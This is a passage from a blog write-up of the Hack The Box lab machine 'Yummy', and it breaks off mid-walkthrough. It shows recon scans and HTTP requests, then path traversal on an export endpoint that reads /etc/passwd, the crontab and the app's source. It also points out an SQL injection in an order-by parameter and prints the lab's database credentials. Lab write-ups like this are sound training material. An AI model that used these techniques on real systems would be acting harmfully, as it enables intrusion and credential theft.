@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Hard - Yummy - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Hard - Yummy</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1730025449561"
+                  >2024-10-27 11:37</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156147485"
+                  >2025-03-16 21:15</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">sql</span>
+              
+              <span class="keyword">pathtraversal</span>
+              
+              <span class="keyword">jwt</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/6b1551c074a745f68cb51068f1eeaf70.png" /></p>
+<div><pre class="hljs"><code>whatweb yummy.htb
+http://yummy.htb <span class="hljs-comment">[200 OK]</span> Bootstrap, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, Email<span class="hljs-comment">[info@yummy.htb]</span>, Frame, HTML5, HTTPServer<span class="hljs-comment">[Caddy]</span>, IP<span class="hljs-comment">[10.129.231.153]</span>, Lightbox, Script, Title<span class="hljs-comment">[Yummy]</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-variable">$sudo</span> nmap -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">231.153</span>
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">9.6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">256</span> <span class="hljs-symbol">a2:</span><span class="hljs-symbol">ed:</span><span class="hljs-number">65</span><span class="hljs-symbol">:</span><span class="hljs-number">77</span><span class="hljs-symbol">:e9</span><span class="hljs-symbol">:c4</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">f:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span><span class="hljs-symbol">:b0</span><span class="hljs-symbol">:b8</span><span class="hljs-symbol">:</span><span class="hljs-number">09</span><span class="hljs-symbol">:eb</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-symbol">bc:</span><span class="hljs-symbol">df:</span><span class="hljs-number">25</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">c:</span><span class="hljs-number">97</span><span class="hljs-symbol">:</span><span class="hljs-number">24</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:b4</span><span class="hljs-symbol">:ce</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">c:</span>f0 (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    Caddy httpd
+|_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//yummy.htb/
+No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see <span class="hljs-symbol">https:</span>//nmap.org/submit/ ).</code></pre></div>
+<p><img src="/_resources/a941283caa844fd9b4c888babb434edc.png" /></p>
+<p>We can find reservation feature, that actaully works. Creating a reservation, tells us that we can menage it in our account. Strannge, as I did not create one yet, but sure.</p>
+<p><img src="/_resources/f5a231ab878942438d89b3d3f3212ef3.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/book</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>yummy.htb
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
+<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://yummy.htb/
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>102
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://yummy.htb
+<span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i
+
+<span class="language-apache"><span class="hljs-attribute">name</span>=test&amp;email=test%<span class="hljs-number">40</span>test.com&amp;phone=<span class="hljs-number">1231231231231</span>&amp;date=<span class="hljs-number">2024</span>-<span class="hljs-number">10</span>-<span class="hljs-number">27</span>&amp;time=<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A57&amp;people=<span class="hljs-number">3</span>&amp;message=test</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>yummy.htb
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
+<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://yummy.htb/login
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>43
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://yummy.htb
+<span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-AUTH-Token=
+<span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0
+
+<span class="language-perl">{<span class="hljs-string">"email"</span>:<span class="hljs-string">"test@test.com"</span>,<span class="hljs-string">"password"</span>:<span class="hljs-string">"test"</span>}</span></code></pre></div>
+<p>Ater creating account and logging in, we get our dashboard with our reseration. We can also export our reservation to icalendar file.</p>
+<p><img src="/_resources/66950cbb4a2741068fc8b3a60e116256.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-symbol">BEGIN:</span>VCALENDAR
+<span class="hljs-symbol">VERSION:</span><span class="hljs-number">2.0</span>
+<span class="hljs-symbol">PRODID:</span>ics.py - http://git.io/lLljaA
+<span class="hljs-symbol">BEGIN:</span>VEVENT
+<span class="hljs-symbol">DESCRIPTION:</span>Email: admin@yummy.htb\nNumber of People: <span class="hljs-number">4</span>\nMessage: <span class="hljs-number">123</span>
+<span class="hljs-symbol">DTSTART:</span><span class="hljs-number">20241027</span>T000000Z
+<span class="hljs-symbol">SUMMARY:</span>admin
+<span class="hljs-symbol">UID:</span>f119cc51<span class="hljs-number">-0833</span><span class="hljs-number">-4</span>a5f-a3fa<span class="hljs-number">-47</span>a52bc3dbf5@f119<span class="hljs-meta">.org</span>
+<span class="hljs-symbol">END:</span>VEVENT
+<span class="hljs-symbol">END:</span>VCALENDAR</code></pre></div>
+<p>We can see that it is being generated using <a title="https://github.com/ics-py/ics-py" href="https://github.com/ics-py/ics-py">ics.py</a>. It’s in version 0.8.0.dev0, so there might be a way to exploit it’s parsing. There are some <a title="https://www.exploit-db.com/exploits/6519" href="https://www.exploit-db.com/exploits/6519">CVE’s</a>, but none for this exact library. Looking at burp, we can see that we also get our file from <code>/export</code>.</p>
+<p><img src="/_resources/3c3f17d761d941509e40cd39a12af7e4.png" /></p>
+<h1 id="path-traversal">Path traversal</h1>
+<p>I tried doing simple path traversal, but to no avail. Then, looking at burp I traced how we get the icalendar file. I modified location of file that is being retrieved and got passwd. Finally something.</p>
+<p><img src="/_resources/5cd3e03f48724f918f8fda3a47f61b04.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
+<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">998</span><span class="hljs-symbol">:systemd</span> Network <span class="hljs-symbol">Management:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">997</span><span class="hljs-symbol">:</span><span class="hljs-number">997</span><span class="hljs-symbol">:systemd</span> Time <span class="hljs-symbol">Synchronization:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">dhcpcd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:DHCP</span> Client Daemon,,,<span class="hljs-symbol">:/usr/lib/dhcpcd</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">992</span><span class="hljs-symbol">:</span><span class="hljs-number">992</span><span class="hljs-symbol">:systemd</span> <span class="hljs-symbol">Resolver:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">polkitd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">991</span><span class="hljs-symbol">:</span><span class="hljs-number">991</span><span class="hljs-symbol">:User</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">polkitd:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">tss:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">108</span><span class="hljs-symbol">:TPM</span> software stack,,,<span class="hljs-symbol">:/var/lib/tpm</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">landscape:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/landscape</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+fwupd-<span class="hljs-symbol">refresh:</span><span class="hljs-symbol">x:</span><span class="hljs-number">989</span><span class="hljs-symbol">:</span><span class="hljs-number">989</span><span class="hljs-symbol">:Firmware</span> update <span class="hljs-symbol">daemon:</span>/var/lib/<span class="hljs-symbol">fwupd:</span>/usr/sbin/nologin
+<span class="hljs-symbol">usbmux:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">46</span><span class="hljs-symbol">:usbmux</span> daemon,,,<span class="hljs-symbol">:/var/lib/usbmux</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">dev:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dev</span><span class="hljs-symbol">:/home/dev</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">caddy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">988</span><span class="hljs-symbol">:Caddy</span> web <span class="hljs-symbol">server:</span>/var/lib/<span class="hljs-symbol">caddy:</span>/usr/sbin/nologin
+<span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">qa:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/qa</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">_laurel:</span><span class="hljs-symbol">x:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-number">987</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/log/laurel</span><span class="hljs-symbol">:/bin/false</span></code></pre></div>
+<p>From it, we can see that there are users <code>qa</code> and <code>dev</code>. Checking their home folders, none of them have <code>id_rsa</code> in their home folders. We can get Caddyfile though.</p>
+<div><pre class="hljs"><code><span class="language-xml">:80 </span><span class="hljs-template-variable">{
+    @ip {
+        header_regexp Host ^(\d{1,3}</span><span class="language-xml">\.)</span><span class="hljs-template-variable">{3}</span><span class="language-xml">\d</span><span class="hljs-template-variable">{1,3}</span><span class="language-xml">$
+    }
+    redir @ip http://yummy.htb</span><span class="hljs-template-variable">{uri}</span><span class="language-xml">
+    reverse_proxy 127.0.0.1:3000 </span><span class="hljs-template-variable">{
+    header_down -Server  
+    }</span><span class="language-xml">
+}</span></code></pre></div>
+<p>Another standard file that we can read would be <code>/etc/crontab</code>. Bingo.</p>
+<div><pre class="hljs"><code>SHELL=<span class="hljs-regexp">/bin/</span>sh
+<span class="hljs-comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span>
+<span class="hljs-comment">#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+
+<span class="hljs-comment"># Example of job definition:</span>
+<span class="hljs-comment"># .---------------- minute (0 - 59)</span>
+<span class="hljs-comment"># |  .------------- hour (0 - 23)</span>
+<span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span>
+<span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="hljs-comment"># |  |  |  |  |</span>
+<span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span>
+<span class="hljs-number">17</span> *	* * *	root	cd <span class="hljs-regexp">/ &amp;&amp; run-parts --report /</span>etc/cron.hourly
+<span class="hljs-number">25</span> <span class="hljs-number">6</span>	* * *	root	test -x <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/anacron || { cd /</span> &amp;&amp; run-parts --report <span class="hljs-regexp">/etc/</span>cron.daily; }
+<span class="hljs-number">47</span> <span class="hljs-number">6</span>	* * <span class="hljs-number">7</span>	root	test -x <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/anacron || { cd /</span> &amp;&amp; run-parts --report <span class="hljs-regexp">/etc/</span>cron.weekly; }
+<span class="hljs-number">52</span> <span class="hljs-number">6</span>	<span class="hljs-number">1</span> * *	root	test -x <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/anacron || { cd /</span> &amp;&amp; run-parts --report <span class="hljs-regexp">/etc/</span>cron.monthly; }
+<span class="hljs-comment">#</span>
+*<span class="hljs-regexp">/1 * * * * www-data /</span>bin<span class="hljs-regexp">/bash /</span>data<span class="hljs-regexp">/scripts/</span>app_backup.sh
+*<span class="hljs-regexp">/15 * * * * mysql /</span>bin<span class="hljs-regexp">/bash /</span>data<span class="hljs-regexp">/scripts/</span>table_cleanup.sh
+* * * * * mysql <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/data/</span>scripts/dbmonitor.sh</code></pre></div>
+<p>Content’s of <code>app_backup.sh</code> :</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+
+<span class="hljs-built_in">cd</span> /var/www
+/usr/bin/rm backupapp.zip
+/usr/bin/zip -r backupapp.zip /opt/app</code></pre></div>
+<p>In the zip file, we can find <code>app.py</code> file, with juicy contents (only relevant to the admin dashboard parts here, full script at the bottom).</p>
+<div><pre class="hljs"><code>app = Flask(__name__, static_url_path=<span class="hljs-string">'/static'</span>)
+temp_dir = <span class="hljs-string">''</span>
+app.secret_key = secrets.token_hex(<span class="hljs-number">32</span>)
+
+db_config = {
+    <span class="hljs-string">'host'</span>: <span class="hljs-string">'127.0.0.1'</span>,
+    <span class="hljs-string">'user'</span>: <span class="hljs-string">'chef'</span>,
+    <span class="hljs-string">'password'</span>: <span class="hljs-string">'3wDo7gSRZIwIHRxZ!'</span>,
+    <span class="hljs-string">'database'</span>: <span class="hljs-string">'yummy_db'</span>,
+    <span class="hljs-string">'cursorclass'</span>: pymysql.cursors.DictCursor,
+    <span class="hljs-string">'client_flag'</span>: CLIENT.MULTI_STATEMENTS
+
+}
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/login'</span>, methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():
+    <span class="hljs-keyword">global</span> access_token
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'GET'</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'login.html'</span>, message=<span class="hljs-literal">None</span>)
+    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">'POST'</span>:
+        email = request.json.get(<span class="hljs-string">'email'</span>)
+        password = request.json.get(<span class="hljs-string">'password'</span>)
+        password2 = hashlib.sha256(password.encode()).hexdigest()
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> email <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:
+            <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"email or password is missing"</span>), <span class="hljs-number">400</span>
+
+        connection = pymysql.connect(**db_config)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"SELECT * FROM users WHERE email=%s AND password=%s"</span>
+                cursor.execute(sql, (email, password2))
+                user = cursor.fetchone()
+                <span class="hljs-keyword">if</span> user:
+                    payload = {
+                        <span class="hljs-string">'email'</span>: email,
+                        <span class="hljs-string">'role'</span>: user[<span class="hljs-string">'role_id'</span>],
+                        <span class="hljs-string">'iat'</span>: datetime.now(timezone.utc),
+                        <span class="hljs-string">'exp'</span>: datetime.now(timezone.utc) + timedelta(seconds=<span class="hljs-number">3600</span>),
+                        <span class="hljs-string">'jwk'</span>:{<span class="hljs-string">'kty'</span>: <span class="hljs-string">'RSA'</span>,<span class="hljs-string">"n"</span>:<span class="hljs-built_in">str</span>(signature.n),<span class="hljs-string">"e"</span>:signature.e}
+                    }
+                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm=<span class="hljs-string">'RS256'</span>)
+
+                    response = make_response(jsonify(access_token=access_token), <span class="hljs-number">200</span>)
+                    response.set_cookie(<span class="hljs-string">'X-AUTH-Token'</span>, access_token)
+                    <span class="hljs-keyword">return</span> response
+                <span class="hljs-keyword">else</span>:
+                    <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Invalid email or password"</span>), <span class="hljs-number">401</span>
+        <span class="hljs-keyword">finally</span>:
+            connection.close()
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/admindashboard'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">admindashboard</span>():
+        validation = validate_login()
+        <span class="hljs-keyword">if</span> validation != <span class="hljs-string">"administrator"</span>:
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+ 
+        <span class="hljs-keyword">try</span>:
+            connection = pymysql.connect(**db_config)
+            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
+                sql = <span class="hljs-string">"SELECT * from appointments"</span>
+                cursor.execute(sql)
+                connection.commit()
+                appointments = cursor.fetchall()
+
+                search_query = request.args.get(<span class="hljs-string">'s'</span>, <span class="hljs-string">''</span>)
+
+                <span class="hljs-comment"># added option to order the reservations</span>
+                order_query = request.args.get(<span class="hljs-string">'o'</span>, <span class="hljs-string">''</span>)
+
+                sql = <span class="hljs-string">f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date <span class="hljs-subst">{order_query}</span>"</span>
+                cursor.execute(sql, (<span class="hljs-string">'%'</span> + search_query + <span class="hljs-string">'%'</span>,))
+                connection.commit()
+                appointments = cursor.fetchall()
+            connection.close()
+            
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'admindashboard.html'</span>, appointments=appointments)
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            flash(<span class="hljs-built_in">str</span>(e), <span class="hljs-string">'error'</span>)
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'admindashboard.html'</span>, appointments=appointments)
+        
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_login</span>():
+    <span class="hljs-keyword">try</span>:
+        (email, current_role), status_code = verify_token()
+        <span class="hljs-keyword">if</span> email <span class="hljs-keyword">and</span> status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> current_role == <span class="hljs-string">"administrator"</span>:
+            <span class="hljs-keyword">return</span> current_role
+        <span class="hljs-keyword">elif</span> email <span class="hljs-keyword">and</span> status_code == <span class="hljs-number">200</span>:
+            <span class="hljs-keyword">return</span> email
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"Invalid token"</span>)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+</code></pre></div>
+<p>Contents of table_cleanup.sh</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/sh</span>
+
+/usr/bin/mysql -h localhost -u chef yummy_db -p<span class="hljs-string">'3wDo7gSRZIwIHRxZ!'</span> &lt; /data/scripts/sqlappointments.sql</code></pre></div>
+<p>Conetns of dbmonitor.sh</p>
